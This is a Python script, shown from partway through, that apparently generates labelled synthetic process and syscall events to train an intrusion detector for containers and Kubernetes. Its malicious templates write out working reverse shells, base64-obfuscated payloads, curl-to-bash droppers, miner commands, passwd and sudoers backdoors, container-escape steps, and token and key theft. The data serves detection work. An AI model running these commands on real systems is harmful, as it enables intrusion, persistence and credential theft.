    lambda ip, p: exe("/usr/bin/python3", ["python3", "-c", f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,"
                                                           f"socket.SOCK_STREAM);s.connect((\"{ip}\",{p}));os.dup2(s.fileno(),0)"],
                      pick(SHELL_PARENTS + WEB_PARENTS)),
    lambda ip, p: exe("/usr/bin/python3", ["python3", "-c", "import pty; pty.spawn(\"/bin/bash\")"], pick(SHELL_PARENTS)),
    lambda ip, p: exe("/usr/bin/perl", ["perl", "-e", f"use Socket;$i=\"{ip}\";$p={p};socket(S,PF_INET,SOCK_STREAM,"
                                                      f"getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))"],
                      pick(SHELL_PARENTS)),
    lambda ip, p: exe("/usr/bin/php", ["php", "-r", f"$sock=fsockopen(\"{ip}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");"],
                      pick(["php-fpm", "sh", "apache2"])),
    lambda ip, p: exe("/usr/bin/socat", ["socat", "exec:'bash -li',pty,stderr,setsid,sigint,sane", f"tcp:{ip}:{p}"],
                      pick(SHELL_PARENTS)),
    lambda ip, p: exe("/usr/bin/awk", ["awk", f"BEGIN {{s = \"/inet/tcp/0/{ip}/{p}\"; while(42) {{ do{{ printf \"shell>\" |& s;"
                                              f" s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s"],
                      pick(SHELL_PARENTS)),
    lambda ip, p: exe("/usr/bin/ruby", ["ruby", "-rsocket", "-e", f"f=TCPSocket.open(\"{ip}\",{p}).to_i;exec sprintf(\"/bin/sh"
                                                                  f" -i <&%d >&%d 2>&%d\",f,f,f)"], pick(SHELL_PARENTS)),
    lambda ip, p: exe("/usr/local/bin/node", ["node", "-e", f"require('child_process').exec('nc -e /bin/sh {ip} {p}')"],
                      pick(SHELL_PARENTS + ["node"])),
    lambda ip, p: exe("/bin/sh", ["sh", "-c", f"exec 5<>/dev/tcp/{ip}/{p};cat <&5 | while read line; do $line 2>&5 >&5; done"],
                      pick(WEB_PARENTS)),
]


@tpl(1, "reverse_shell", "T1059.004", weight=6, profile="interactive")
def reverse_shell_exec():
    return pick(REVERSE_SHELLS)(any_ip(), rev_port())


@tpl(1, "reverse_shell", "T1059.004", weight=2, profile="interactive", edge=True)
def reverse_shell_obfuscated():
    ip, p = any_ip(), rev_port()
    payload = f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"
    opts = [sh_c(f"echo {b64(payload)} | base64 -d | bash", pick(WEB_PARENTS + SHELL_PARENTS)),
            exe("/bin/bash", ["bash", "-c", f"$(echo {b64(payload)}|base64 -d)"], pick(WEB_PARENTS)),
            exe("/usr/bin/python3", ["python3", "-c", f"exec(__import__('base64').b64decode('{b64('import os;os.system(chr(98))')}'))"],
                pick(SHELL_PARENTS + WEB_PARENTS)),
            sh_c(f"echo {b64(payload)}|base64 --decode|sh", "sh")]
    return pick(opts)


@tpl(1, "reverse_shell", "T1071", weight=4, profile="interactive", edge=True)
def reverse_shell_connect():
    comm = pick(["bash", "sh", "nc", "ncat", "socat", "python3", "perl", "php", "ruby", "awk", "dash", "busybox"])
    return conn(comm, any_ip(), rev_port(), pick(SHELL_PARENTS + WEB_PARENTS))


@tpl(1, "reverse_shell", "T1071", weight=1.5, profile="slow", edge=True)
def reverse_shell_slow():
    comm = pick(["python3", "node", "perl", "bash"])
    return conn(comm, pub_ip(), pick([443, 8443, 80, 53, 4444]), pick(WEB_PARENTS))


DROPPER = [
    lambda u, ip, n: exe("/usr/bin/wget", ["wget", f"http://{ip}/{n}.sh", "-O", f"/tmp/{n}.sh"], pick(SHELL_PARENTS + WEB_PARENTS)),
    lambda u, ip, n: sh_c(f"curl -s http://{ip}/payload | bash", pick(SHELL_PARENTS + WEB_PARENTS)),
    lambda u, ip, n: sh_c(f"curl -fsSL http://{u}/i.sh | sh", pick(SHELL_PARENTS + WEB_PARENTS)),
    lambda u, ip, n: sh_c(f"wget -qO- http://{ip}:{pick([8080, 80, 8000])}/s | sh", pick(SHELL_PARENTS + WEB_PARENTS)),
    lambda u, ip, n: exe("/bin/busybox", ["busybox", "wget", f"http://{ip}/bin", "-O", f"/dev/shm/.{n}"], "sh"),
    lambda u, ip, n: sh_c(f"curl -o /tmp/.{n} http://{ip}/x && chmod +x /tmp/.{n} && /tmp/.{n}", pick(WEB_PARENTS + ["sh"])),
    lambda u, ip, n: exe("/usr/bin/tftp", ["tftp", "-g", "-r", n, ip], "sh"),
    lambda u, ip, n: exe("/usr/bin/python3", ["python3", "-c", f"import urllib.request;urllib.request.urlretrieve("
                                                              f"'http://{ip}/{n}','/tmp/{n}')"], pick(SHELL_PARENTS)),
    lambda u, ip, n: sh_c(f"curl -fsSL https://raw.githubusercontent.com/{word()}/{word()}/main/{n}.sh | bash",
                          pick(WEB_PARENTS + SHELL_PARENTS)),
    lambda u, ip, n: sh_c("curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", "sh"),
    lambda u, ip, n: exe("/usr/bin/curl", ["curl", "-k", "-o", f"/var/tmp/.{n}", f"https://{u}/{n}"], "sh"),
    lambda u, ip, n: exe("/usr/bin/scp", ["scp", f"x@{ip}:/{n}", f"/tmp/{n}"], "sh"),
]


@tpl(1, "dropper", "T1105", weight=6, profile="automated")
def dropper_download():
    return pick(DROPPER)(evil_domain(), any_ip(), word())


@tpl(1, "dropper", "T1204.002", weight=3, profile="automated", edge=True)
def exec_from_tmp():
    n = pick(["kworker", "sshd", "systemd-update", ".x", "a", "nginx", "httpd", word(), "kthreadd", ".cache"])
    d = pick(["/tmp/", "/tmp/.x/", "/dev/shm/", "/var/tmp/.sys/", "/tmp/.ICE-unix/", "/dev/shm/.d/"])
    return exe(f"{d}{n}", [f"{d}{n}"] + pick([[], ["-d"], ["--daemon"], [any_ip()]]), pick(SHELL_PARENTS + ["nohup"]))


@tpl(1, "dropper", "T1222.002", weight=2, profile="automated", edge=True)
def chmod_tmp_payload():
    p = f"{pick(['/tmp/', '/dev/shm/', '/var/tmp/'])}{pick(['.', ''])}{word()}"
    return pick([sysc("chmod", "chmod", "sh", flags=pick([0o755, 0o777, 0o700]), path=p),
                 exe("/bin/chmod", ["chmod", pick(["+x", "777", "755"]), p], "sh")])


MINER_NAMES = ["xmrig", "kdevtmpfsi", "kinsing", "kworkerds", "sysupdate", "minerd", ".xm", "systemd-journal",
               "nginx", "dbused", "solr.sh", "watchdog"]


@tpl(1, "crypto_miner", "T1496", weight=4, profile="automated")
def miner_exec():
    pool = pick(["pool.minexmr.com", "pool.supportxmr.com", "xmr.pool.minergate.com", "gulf.moneroocean.stream",
                 "xmr-eu1.nanopool.org", evil_domain()])
    port = pick([3333, 4444, 5555, 14444, 45700, 443, 10128])
    n = pick(MINER_NAMES)
    d = pick(["/tmp/.xm/", "/tmp/", "/var/tmp/", "/dev/shm/", "/usr/local/bin/", "/opt/.cache/"])
    opts = [exe(f"{d}{n}", [n, "-o", f"stratum+tcp://{pool}:{port}", "-u", wallet(), "-p", "x", "--donate-level", "1"],
                pick(SHELL_PARENTS + ["nohup"])),
            exe(f"{d}{n}", [n, f"--config={d}config.json"], pick(SHELL_PARENTS + ["nohup"])),
            exe(f"{d}minerd", ["minerd", "-a", "cryptonight", "-o", f"stratum+tcp://{pool}:{port}", "-u", wallet()], "sh"),
            sh_c(f"nohup {d}{n} -o {pool}:{port} -u {wallet()[:40]} -k --tls >/dev/null 2>&1 &", "sh"),
            exe(f"{d}{n}", [n, "-B", "-a", "rx/0", "-o", f"{pool}:{port}"], "sh")]
    return pick(opts)


@tpl(1, "crypto_miner", "T1496", weight=3, profile="automated", edge=True)
def miner_connect():
    return conn(pick(MINER_NAMES), pub_ip(), pick([3333, 4444, 5555, 14444, 14433, 45700, 443, 10128, 7777]),
                pick(SHELL_PARENTS + ["nohup", "systemd"]))


@tpl(1, "privilege_escalation", "T1548.001", weight=3, profile="interactive")
def suid_abuse():
    target = pick(["/bin/bash", "/tmp/rootsh", "/usr/bin/find", "/tmp/.s", "/bin/sh", "/usr/bin/python3"])
    return pick([exe("/bin/chmod", ["chmod", pick(["u+s", "+s", "4755", "4777", "6755"]), target], pick(SHELL_PARENTS)),
                 sysc("chmod", pick(["chmod", "python3", "perl", "sh"]), "sh", flags=pick([0o4755, 0o4777, 0o6755]),
                      path=target)])


@tpl(1, "privilege_escalation", "T1068", weight=3, profile="interactive", edge=True)
def exploit_setuid():
    opts = [sysc("setuid", pick(["exploit", "pwnkit", "a.out", "python3", "perl", "dirtypipe", "cve", "x"]),
                 pick(SHELL_PARENTS), flags=0, uid=pick([1000, 1001, 33, 65534])),
            exe(f"/tmp/{pick(['pwnkit', 'dirtypipe', 'exploit', 'cve-2022-0847', 'a.out', 'overlayfs'])}",
                [pick(["./exploit", "./pwn", "./a.out"])] + pick([[], ["/usr/bin/su"], ["-p"]]), pick(SHELL_PARENTS),
                uid=pick([1000, 33, 65534])),
            exe("/usr/bin/find", ["find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null"], pick(SHELL_PARENTS)),
            exe("/usr/bin/sudo", ["sudo", "-l"], pick(SHELL_PARENTS), uid=pick([1000, 33])),
            exe("/usr/bin/pkexec", ["pkexec", "--user", "root", "/bin/sh"], "sh", uid=1000)]
    return pick(opts)


@tpl(1, "privilege_escalation", "T1098", weight=3, profile="interactive", edge=True)
def tamper_auth_files():
    opts = [opn(pick(["sh", "bash", "tee", "python3", "echo", "perl"]), pick(["/etc/passwd", "/etc/sudoers", "/etc/shadow",
                                                                            "/etc/sudoers.d/99-x", "/etc/group"]),
                pick(SHELL_PARENTS), flags=pick([O_APPEND_W, O_WR])),
            sh_c("echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd", pick(SHELL_PARENTS + WEB_PARENTS)),
            sh_c("echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", pick(SHELL_PARENTS)),
            opn(pick(["sh", "gcc", "tee", "python3"]), "/etc/ld.so.preload", "sh", flags=pick([O_WR, O_APPEND_W])),
            opn(pick(["sh", "tee", "bash"]), pick(["/etc/crontab", "/var/spool/cron/crontabs/root", "/etc/cron.d/x"]),
                "sh", flags=O_APPEND_W),
            sh_c(f"(crontab -l; echo '* * * * * curl -s http://{any_ip()}/c|sh') | crontab -", pick(SHELL_PARENTS)),
            opn(pick(["sh", "bash", "tee"]), pick(["/root/.ssh/authorized_keys", "/etc/profile", "/etc/bash.bashrc"]),
                "sh", flags=O_APPEND_W, uid=0)]
    return pick(opts)


@tpl(1, "container_escape", "T1611", weight=4, profile="interactive")
def escape_exec():
    opts = [exe("/usr/bin/nsenter", ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"],
                pick(SHELL_PARENTS)),
            exe("/usr/bin/nsenter", ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "sh"], pick(SHELL_PARENTS)),
            exe("/bin/mount", ["mount", pick(["/dev/sda1", "/dev/nvme0n1p1", "/dev/vda1", "/dev/xvda1"]), "/mnt"], pick(SHELL_PARENTS)),
            exe("/bin/mount", ["mount", "-t", "cgroup", "-o", "rdma", "cgroup", "/tmp/cgrp"], "sh"),
            sh_c("echo 1 > /tmp/cgrp/x/notify_on_release; echo \"$host_path/cmd\" > /tmp/cgrp/release_agent", "sh"),
            exe("/usr/bin/unshare", ["unshare", "-UrmC", "bash"], pick(SHELL_PARENTS)),
            exe("/usr/sbin/chroot", ["chroot", "/host", "/bin/bash"], pick(SHELL_PARENTS)),
            exe("/usr/bin/docker", ["docker", "-H", "unix:///var/run/docker.sock", "run", "-it", "--privileged", "-v", "/:/host",
                                    "alpine", "chroot", "/host"], pick(SHELL_PARENTS)),
            exe("/usr/bin/curl", ["curl", "--unix-socket", "/var/run/docker.sock", "http://localhost/containers/json"], "sh"),
            sh_c("echo '|/tmp/x.sh' > /proc/sys/kernel/core_pattern", "sh"),
            exe("/sbin/insmod", ["insmod", f"/tmp/{pick(['rootkit', 'diamorphine', 'reptile', word()])}.ko"], "sh"),
            exe("/usr/bin/ls", ["ls", "/proc/1/root/"], pick(SHELL_PARENTS))]
    return pick(opts)


@tpl(1, "container_escape", "T1611", weight=4, profile="interactive", edge=True)
def escape_syscall():
    opts = [sysc("setns", "nsenter", pick(SHELL_PARENTS), flags=pick([CLONE_NEWNS, CLONE_NEWPID, CLONE_NEWNET, 0])),
            sysc("mount", pick(["mount", "sh", "python3"]), "sh", path=pick(["/mnt", "/host", "/mnt/host", "/tmp/cgrp"]),
                 cmdline=pick(["/dev/sda1 ext4", "/dev/nvme0n1p1 xfs", "cgroup cgroup", "/ ", "/dev/vda1 ext4"]), argc=2),
            sysc("unshare", pick(["unshare", "bash", "python3", "exploit"]), "sh",
                 flags=pick([CLONE_NEWUSER | CLONE_NEWNS, CLONE_NEWUSER, CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWCGROUP])),
            unix(pick(["curl", "docker", "python3", "sh", "socat", "nc"]), pick(["/var/run/docker.sock", "/run/containerd/containerd.sock",
                                                                                 "/var/run/cri-dockerd.sock"]), "sh"),
            opn(pick(["sh", "bash", "echo", "tee"]), pick(["/proc/sys/kernel/core_pattern", "/proc/sys/kernel/modprobe"]), "sh",
                flags=O_WR),
            sysc("module", pick(["insmod", "modprobe", "exploit", "python3"]), "sh", flags=3, arg2=1),
            sysc("ptrace", pick(["python3", "sh", "injector", "exploit", "gdb", "a.out"]), "sh", flags=pick([16, 0x4206, 4, 5]),
                 arg2=pick([1, R.randint(2, 50000)])),
            opn(pick(["cat", "dd", "python3", "strings"]), pick(["/proc/kcore", "/dev/mem"]), "sh")]
    return pick(opts)


@tpl(1, "credential_access", "T1528", weight=4, profile="interactive")
def sa_token_theft():
    tok = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    opts = [exe("/bin/cat", ["cat", tok], pick(SHELL_PARENTS + WEB_PARENTS)),
            opn(pick(["cat", "sh", "bash", "curl", "head", "base64", "python3", "perl", "node", "php"]), tok,
                pick(SHELL_PARENTS + WEB_PARENTS)),
            exe("/usr/bin/curl", ["curl", "-sk", "-H", f"Authorization: Bearer {jwt()}",
                                  pick(["https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
                                        "https://10.96.0.1/api/v1/secrets", "https://kubernetes.default/api/v1/pods"])],
                pick(SHELL_PARENTS)),
            exe("/usr/local/bin/kubectl", ["kubectl", pick(["get", "describe"]), "secrets", "-A"], pick(SHELL_PARENTS)),
            exe("/usr/local/bin/kubectl", ["kubectl", "auth", "can-i", "--list"], pick(SHELL_PARENTS)),
            sh_c(f"cat {tok} | base64 -w0", pick(SHELL_PARENTS + WEB_PARENTS))]
    return pick(opts)


@tpl(1, "credential_access", "T1003.008", weight=4, profile="interactive", edge=True)
def host_credential_theft():
    opts = [opn(pick(["cat", "python3", "sh", "grep", "head", "cp", "tar", "less", "base64"]),
                pick(["/etc/shadow", "/etc/gshadow", "/root/.ssh/id_rsa", "/root/.ssh/id_ed25519", "/etc/kubernetes/admin.conf",
                      "/etc/ssh/ssh_host_rsa_key", "/var/lib/kubelet/pki/kubelet-client-current.pem"]),
                pick(SHELL_PARENTS + WEB_PARENTS)),
            exe("/bin/cat", ["cat", pick(["/etc/shadow", "/root/.ssh/id_rsa", "/etc/kubernetes/admin.conf"])], pick(SHELL_PARENTS)),
            exe("/bin/grep", ["grep", "-ri", pick(["password", "secret", "api_key", "token"]), pick(["/etc", "/app", "/"])],
                pick(SHELL_PARENTS)),
            exe("/usr/bin/find", ["find", "/", "-name", pick(["*.pem", "id_rsa", "*.kubeconfig", ".env", "credentials"])], "sh"),
            sh_c("env | grep -i -E 'key|secret|token|pass'", pick(SHELL_PARENTS + WEB_PARENTS)),
            exe("/usr/bin/curl", ["curl", "-s", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
                pick(SHELL_PARENTS)),
            conn(pick(["curl", "python3", "wget", "sh"]), "169.254.169.254", 80, pick(SHELL_PARENTS)),
            exe("/bin/tar", ["tar", "czf", "/tmp/.l.tgz", "/root/.ssh", "/etc/shadow"], "sh")]
    return pick(opts)


@tpl(1, "discovery", "T1082", weight=4, profile="interactive", edge=True)
def recon_from_webapp():
    argv = pick([["id"], ["whoami"], ["uname", "-a"], ["hostname"], ["cat", "/etc/os-release"], ["cat", "/proc/1/cgroup"],
                 ["ls", "-la", "/.dockerenv"], ["capsh", "--print"], ["ps", "aux"], ["netstat", "-antp"], ["mount"],
                 ["cat", "/proc/self/status"], ["ls", "/var/run/secrets/kubernetes.io/serviceaccount"], ["env"],
                 ["getcap", "-r", "/"]])
    return exe(f"/usr/bin/{argv[0]}", argv, pick(WEB_PARENTS))


@tpl(1, "discovery", "T1046", weight=3, profile="interactive")
def network_scan():
    net = pick(["10.244.0.0/24", "10.96.0.0/16", "192.168.49.0/24", "172.17.0.0/16"])
    opts = [exe("/usr/bin/nmap", ["nmap", "-sS", "-p-", "--open", net], pick(SHELL_PARENTS)),
            exe("/usr/bin/nmap", ["nmap", "-sV", "-p", "10250,2379,6443,8080", net], pick(SHELL_PARENTS)),
            exe("/usr/bin/masscan", ["masscan", net, "-p0-65535", "--rate", "10000"], "sh"),
            exe("/usr/bin/nc", ["nc", "-zv", priv_ip(), f"1-{pick([1000, 10000, 65535])}"], pick(SHELL_PARENTS)),
            sh_c(f"for i in $(seq 1 254); do ping -c1 -W1 10.244.0.$i; done", "sh"),
            exe("/usr/bin/curl", ["curl", "-sk", pick(["https://kubernetes.default.svc/version", "https://10.96.0.1:443/api/v1/namespaces",
                                                       "https://kubernetes.default/api"])], pick(SHELL_PARENTS + WEB_PARENTS))]
    return pick(opts)


@tpl(1, "discovery", "T1613", weight=2, profile="interactive", edge=True)
def apiserver_probe_connect():
    return conn(pick(["curl", "wget", "nc", "sh", "bash"]), pick(["10.96.0.1", "192.168.49.2"]), pick([443, 6443, 8443]),
                pick(SHELL_PARENTS))


@tpl(1, "defense_evasion", "T1070", weight=3, profile="interactive")
def log_tampering():
    opts = [exe("/bin/bash", ["bash", "-c", "unset HISTFILE; history -c"], pick(SHELL_PARENTS)),
            sh_c("rm -rf /var/log/*", "sh"), exe("/usr/bin/shred", ["shred", "-u", "/var/log/auth.log"], "sh"),
            exe("/usr/bin/truncate", ["truncate", "-s", "0", "/var/log/syslog"], "sh"),
            sh_c("ln -sf /dev/null ~/.bash_history", "bash"), exe("/bin/rm", ["rm", "-f", "/root/.bash_history"], "bash"),
            exe("/usr/bin/touch", ["touch", "-r", "/bin/ls", f"/tmp/.{word()}"], "sh"),
            exe("/usr/bin/pkill", ["pkill", "-f", pick(["falco", "ids_loader", "ids-agent", "tetragon"])], "sh"),
            exe("/sbin/iptables", ["iptables", "-F"], "sh"),
            sh_c("export HISTFILE=/dev/null HISTSIZE=0", "bash")]
    return pick(opts)


@tpl(1, "defense_evasion", "T1620", weight=3, profile="automated", edge=True)
def fileless_exec():
    opts = [sysc("memfd", pick(["python3", "perl", "sh", "x", "a.out", "php", "node"]), pick(SHELL_PARENTS + WEB_PARENTS),
                 flags=pick([0, 1]), path=pick(["", "", "x", "a", word(), " ", "payload"])),
            exe(f"/proc/self/fd/{R.randint(3, 9)}", [pick(["[kworker/0:1]", "sshd", "x"])], pick(["python3", "perl", "sh"])),
            exe("/memfd: (deleted)", ["/memfd: (deleted)"], pick(["python3", "perl"])),
            exe("/usr/bin/python3", ["python3", "-c", "import os;f=os.memfd_create('');os.write(f,open('/dev/stdin','rb').read());"
                                                     "os.execv('/proc/self/fd/%d'%f,['x'])"], pick(SHELL_PARENTS)),
            exe(f"/dev/fd/{R.randint(3, 9)}", ["x"], "bash")]
    return pick(opts)


@tpl(1, "lateral_movement", "T1021.004", weight=3, profile="interactive", edge=True)
def lateral_movement():
    ip = priv_ip()
    opts = [exe("/usr/bin/ssh", ["ssh", "-i", "/tmp/id_rsa", "-o", "StrictHostKeyChecking=no", f"root@{ip}"], pick(SHELL_PARENTS)),
            exe("/usr/bin/sshpass", ["sshpass", "-p", word(), "ssh", f"admin@{ip}"], "sh"),
            conn("ssh", ip, 22, pick(SHELL_PARENTS)),
            exe("/usr/bin/curl", ["curl", "-sk", f"https://{ip}:10250/run/{pick(APP_NS)}/{word()}/{word()}", "-d", "cmd=id"],
                pick(SHELL_PARENTS)),
            conn(pick(["curl", "python3", "sh", "kubeletctl", "wget"]), ip, pick([10250, 10255, 2379, 2380]), pick(SHELL_PARENTS)),
            exe("/usr/local/bin/etcdctl", ["etcdctl", f"--endpoints=https://{ip}:2379", "get", "/", "--prefix", "--keys-only"], "sh"),
            exe("/usr/local/bin/kubectl", ["kubectl", "exec", "-it", f"{word()}-{hexs(5)}", "--", "sh"], pick(SHELL_PARENTS)),
            exe("/usr/bin/redis-cli", ["redis-cli", "-h", ip, "config", "set", "dir", "/root/.ssh"], pick(SHELL_PARENTS)),
            conn(pick(["redis-cli", "python3", "nc"]), ip, 6379, pick(SHELL_PARENTS))]
    return pick(opts)


@tpl(1, "reverse_shell", "T1059", weight=3, profile="interactive")
def orig_anomalous():
    """The 7 attack patterns of the original v0 dataset."""
    parent, cmd = pick([("sh", "/bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1"),
                        ("bash", "/usr/bin/wget http://evil.com/miner.sh -O /tmp/miner.sh"),
                        ("bash", "/usr/bin/curl -s http://192.168.1.100/payload | bash"),
                        ("sh", "/usr/bin/nc -e /bin/sh 10.0.0.1 8080"),
                        ("bash", "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx | base64 -d | sh"),
                        ("python3", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
                        ("sh", "chmod +s /bin/bash")])
    if "|" in cmd or ">&" in cmd:
        return sh_c(cmd, parent)
    argv = cmd.split(" ")
    return exe(argv[0] if argv[0].startswith("/") else f"/usr/bin/{argv[0]}", [os.path.basename(argv[0])] + argv[1:], parent)


# ----------------------------------------------------------------------------- behaviour windows
def window(profile: str, label: int, e: dict) -> dict:
    p = lambda lam: int(R.expovariate(1 / lam)) if lam > 0 else 0  # noqa: E731
    if profile == "steady":
        w = dict(win_exec_count=p(3), win_distinct_bins=0, win_connect_count=p(8), win_distinct_dst=R.randint(0, 4),
                 win_sensitive_opens=p(0.4), win_shell_count=p(0.8), win_new_binary=int(R.random() < 0.04))
    elif profile == "startup":
        w = dict(win_exec_count=R.randint(3, 40), win_distinct_bins=0, win_connect_count=p(5),
                 win_distinct_dst=R.randint(0, 5), win_sensitive_opens=p(1), win_shell_count=R.randint(0, 8),
                 win_new_binary=int(R.random() < 0.12))
    elif profile == "burst_ci":
        w = dict(win_exec_count=R.randint(20, 450), win_distinct_bins=0, win_connect_count=R.randint(0, 90),
                 win_distinct_dst=R.randint(1, 20), win_sensitive_opens=p(1), win_shell_count=R.randint(2, 60),
                 win_new_binary=int(R.random() < 0.35))
    elif profile == "interactive":
        w = dict(win_exec_count=R.randint(3, 80), win_distinct_bins=0, win_connect_count=R.randint(0, 15),
                 win_distinct_dst=R.randint(0, 6), win_sensitive_opens=R.randint(0, 6), win_shell_count=R.randint(1, 25),
                 win_new_binary=int(R.random() < 0.7))
    elif profile == "automated":
        w = dict(win_exec_count=R.randint(2, 35), win_distinct_bins=0, win_connect_count=R.randint(1, 40),
                 win_distinct_dst=R.randint(1, 12), win_sensitive_opens=p(1), win_shell_count=R.randint(0, 10),
                 win_new_binary=int(R.random() < 0.8))
    else:  # slow-and-low attacks
        w = dict(win_exec_count=R.randint(0, 4), win_distinct_bins=0, win_connect_count=R.randint(0, 3),
                 win_distinct_dst=R.randint(0, 2), win_sensitive_opens=R.randint(0, 1), win_shell_count=R.randint(0, 2),
                 win_new_binary=int(R.random() < 0.4))
    if e["event_type"] == "exec":
        w["win_exec_count"] = max(1, w["win_exec_count"])
    if e["event_type"] == "connect":
        w["win_connect_count"] = max(1, w["win_connect_count"])
        w["win_distinct_dst"] = max(1, min(w["win_distinct_dst"], w["win_connect_count"]))
    w["win_distinct_bins"] = min(w["win_exec_count"], max(1 if w["win_exec_count"] else 0,
                                                          int(w["win_exec_count"] * R.uniform(0.1, 0.8))))
    w["win_shell_count"] = min(w["win_shell_count"], w["win_exec_count"])
    if e["event_type"] != "exec":
        w["win_new_binary"] = 0
    return w


def generate(n_benign: int, n_malicious: int, seed: int):
    R.seed(seed)
    rows = []
    for pool, n in ((BENIGN, n_benign), (MALICIOUS, n_malicious)):
        weights = [t["weight"] for t in pool]
        for t in R.choices(pool, weights=weights, k=n):
            e = t["fn"]()
            e.update(window(t["profile"], t["label"], e))
            e.update(is_malicious=t["label"], attack_category=t["category"], mitre_technique=t["mitre"],
                     template=t["name"], is_edge_case=int(t["edge"]))
            rows.append(e)
    R.shuffle(rows)
    return rows


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--benign", type=int, default=30000)
    ap.add_argument("--malicious", type=int, default=10000)
    ap.add_argument("--seed", type=int, default=7)
    ap.add_argument("--out", default=os.path.join(HERE, "training_data.csv"))
    a = ap.parse_args()

    rows = generate(a.benign, a.malicious, a.seed)
    with open(a.out, "w", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=COLUMNS)
        w.writeheader()
        w.writerows(rows)

    from collections import Counter
    cats = Counter(r["attack_category"] for r in rows)
    print(f"Wrote {len(rows)} rows to {a.out}")
    print(f"  templates: {len(BENIGN)} benign, {len(MALICIOUS)} malicious; "
          f"edge-case rows: {sum(r['is_edge_case'] for r in rows)}")
    for c, n in sorted(cats.items(), key=lambda x: -x[1]):
        print(f"  {c:22s} {n}")


if __name__ == "__main__":
    main()
